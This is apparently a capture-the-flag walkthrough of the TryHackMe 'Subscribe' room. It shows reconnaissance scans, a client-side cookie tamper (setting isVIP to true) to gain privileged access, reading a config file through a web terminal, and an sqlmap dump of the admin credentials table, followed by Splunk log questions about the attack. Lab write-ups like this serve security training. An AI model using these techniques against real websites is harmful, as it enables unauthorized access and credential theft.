# TryHack3M: Subscribe

Welcome to the third challenge of the 3 million special on TryHackMe, here is the official [page](https://tryhackme.com/r/room/subscribe). <br>
In this room we are gonna practice with some web exploitation, SQLi and finally Investigating logs with Splunk.

The level of the challenge is set to medium as the previous, being similar in difficulty as the previous one.

Whenever you feel ready download the task file, unzip it and start the machine and connect via OpenVPN or AttackBox.

<br/>
<br/>

## The Story
"We have good news and bad news! The good news is that we are about to hit 3 million users on our platform, and the bad news is:

Well, last night, the UnderGround (UG) Hackers attacked our website, `hackme.thm`, and took complete control. They were able to turn off the signup page, so there won't be any new registrations. Given this, our user count is stuck at `2.99 Million`.

Can you help us restore the registration panel on our site to reach our 3 million user milestone?"

<br/>
<br/>

## The Challenge
Looks like we have to help the company to restore the site, let's begin!

First thing first let's add the machine IP address to the hosts file:
```bash
sudo nano /etc/hosts
```
```
MACHINE_IP hackme.thm HackM3.thm
```

I have started as usual with a port scan to get a better picture of the services running on the machine:
```bash
nmap -sV -p- hackme.thm
```

And we have some ports open:
```
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http          Apache httpd 2.4.41 ((Ubuntu))
1186/tcp filtered mysql-cluster
3826/tcp filtered wormux
5877/tcp filtered unknown
8000/tcp open     http          Splunkd httpd
8089/tcp open     ssl/http      Splunkd httpd
40009/tcp open    unknown
```

Time to do some directory scan of the website:
```bash
gobuster dir -u http://hackme.thm/  -w /usr/share/wordlists/dirb/common.txt -t 50 -k
```

i have found the following:
```
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 310] [--> http://10.10.165.34/css/]
/favicon.ico          (Status: 200) [Size: 15086]
/img                  (Status: 301) [Size: 310] [--> http://10.10.165.34/img/]
/index.php            (Status: 200) [Size: 4499]
/javascript           (Status: 301) [Size: 317] [--> http://10.10.165.34/javascript/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.165.34/js/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.165.34/phpmyadmin/]
/server-status        (Status: 403) [Size: 277]
```

After exploring them i found an interesting file called invite.js under the /js directory, let's view it:
```javascript
funtion e() {
    var e = window.location.hostname;
    if (e === "capture3millionsubscribers.thm") {
        var o = new XMLHttpRequest;
        o.open("POST", "inviteCode1337HM.php", true);
        o.onload = function() {
            if (this.status == 200) {
                console.log("Invite Code:", this.responseText)
            } else {
                console.error("Error fetching invite code.")
            }
        };
        o.send()
    } else if (e === "hackme.thm") {
        console.log("This function does not operate on hackme.thm")
    } else {
        console.log("Lol!! Are you smart enought to get the invite code?")
    }
}
```

This script defines a function called "e", it will check if the current domain is "capture3millionsubscribers.thm", if it is it will send a POST request to the "inviteCode1337HM.php" page and we will get the invite code,
To do it we need to add the domain name to our /etc/hosts file, once we have done it we can visit the website and navigate to the signup page.
```
http://capture3millionsubscribers.thm/sign_up.php
```

Now we need to trigger the function, in the signup page open the dev tools, navigate to the console and call the function like this:
```javascript
(function() 
{
    e();
})();
```
and we have it printed on the console screen: REDACTED

After sending the code into the signup page form we get the following message "*Awesome, you did it! Your username and password are [REDACTED]*", we can now submit the answer to the second question.

With the credentials we click on the login button and access the dashboard, we can notice that the second room requires a VIP access to use it.
Looking at either the request or the browser cookies we can see a field called `isVIP` and it is set ot `false`, what happens if we change it to `true`?

Now we can access the second room, and there is also the option to start a machine, but clicking on it i still get the error "This page is only for VIP users".
I decided to use Burp Suite proxy feature to grab the request while pressing the start machine button, and here i can see that it calls the page "BBF813FA941496FCE961EBA46D754FF3.php", changing again the cookie value to `true` and sending the request via repeater i can see some interesting things in the response.

The code suggest the presence of  an emulated terminal, where we can run some commands, let's visit the page with the browser and continue from there to have an easier interface
```
http://capture3millionsubscribers.thm/BBF813FA941496FCE961EBA46D754FF3.php
```

In the terminal we can then run `ls` to view the content of the directory, one file look interesting, let's open it
```bash
cat config.php
```

```php
<?php
REDACTED
?>
```
The PHP script gives us the secure token and the URL to access the admin panel.

If we navigate to the page we get a 403 error because we need to find a way to submit the secure token, i firstly tried to create a cookie with the same name and value as the second line of the script but it did not work, so i have decided to run *gobuster* to find out if there might be a specific page to submit the token.
```bash
gobuster dir -u http://admin1337special.hackme.thm:40009/public/html/  -w /usr/share/wordlists/dirb/common.txt -t 50 -k
```

It discovered one potentially useful page called /login, we can navigate to it and there is a form to submit the auth code
```
http://admin1337special.hackme.thm:40009/public/html/login
```

Once we passed the token we get redirected into a login page where we have to provide both a username and a password, but we do not have the credentials yet. <br>
Looking at the page source code we can notice a javascript file:
```javascript
function login() {
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    fetch('../../api/login.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: username,
        password: password,
      }),
    })
    .then(response => response.json())
    .then(data => {
      if (data.error) {
        alert(data.error);
      } else {
        // Redirect to the dashboard or the admin page based on the role
        window.location.href = data.role == 'admin' ? 'dashboard.php' : 'dashboard.php';
      }
    })
    .catch((error) => {
      console.error('Error:', error);
    });
  }
```

The script will post our credentials, and than perform a check, if the role associated with that identity is admin we get redirected to the admin page, otherwise at the dashboard. <br>
I captured the request by sending some random strings as credentials to see it, and there is an API call, maybe is retrieving data from the MySQL database found with nmap, and we can access it or dump some information.

I decided to use *sqlmap* for the job, so let's first save the captured request of the login into a text file, than run sqlmap to try to dump the database:
```bash
sqlmap --dump -r captured_request.txt
```

Wait a little bit and it will successfully dump the table containing the username and password for the admin login: 
```
Database: hackme
Table: users
[1 entry]
+----+------------------+------------+--------+----------+--------------+----------+
| id | email            | name       | role   | status   | password     | username |
+----+------------------+------------+--------+----------+--------------+----------+
| 1  | admin@hackme.thm | Admin User | admin  | 1        | REDACTED     | REDACTED |
+----+------------------+------------+--------+----------+--------------+----------+
```

Once we have it, log-in, select the sign-up function in the selection form and click on "set options", now we have re activated the feature, we can visit the main website to receive the final flag:
--> REDACTED

<br/>
<br/>

## Splunk Investigation
Now is time to investigate the events that caused the exploitation of the website and answer the questions.

Visit the page and log in with admin:splunklab
```
http://MACHINE_IP:8000/
```

Once inside, select "search and reporting" on the left panel, then select "all-time" on the right side of the search bar to display all the logs, finally we have to chose the logs to view with `index=main`

**1. How many logs are ingested in the Splunk instance?** <br>
Search for the main index and read the number of logs under the search bar. <br>
```
index=main
```
--> REDACTED

<br>

**2. What is the web hacking tool used by the attacker to exploit the vulnerability on the website?** <br>
On the left side, under "interesting fields" we can select the user-agent and notice a familiar tool name. <br>
--> REDACTED

<br>

**3. How many total events were observed related to the attack?** <br>
After viewing the user-agent field, we can click on it to add it as a filter and display only the logs related to the attack. <br>
--> REDACTED

<br>

**4. What is the observed IP address of the attacker?** <br>
Looking at the logs we can see the source_ip of the traffic coming from the tool. <br>
--> REDACTED

<br/>

**5. How many events were observed from the attacker's IP?** <br>
To answer this we can clean the search query and search only for the attacker IP:
```
index=main  source_ip="83.45.212.17"
```
--> REDACTED

<br/>

**6. What is the table used by the attacker to execute the attack?** <br>
Finally with the same query as in the previous question we can now look at the left field called URI, one looks really interesting as it contains an SQL query showing us the table that was used. <br>
--> REDACTED

<br/>
<br/>

Congratulations, you have completed the third room of the 3 million special series, hope you had fun doing this CTF and following along.

See you in the next challenge 😃
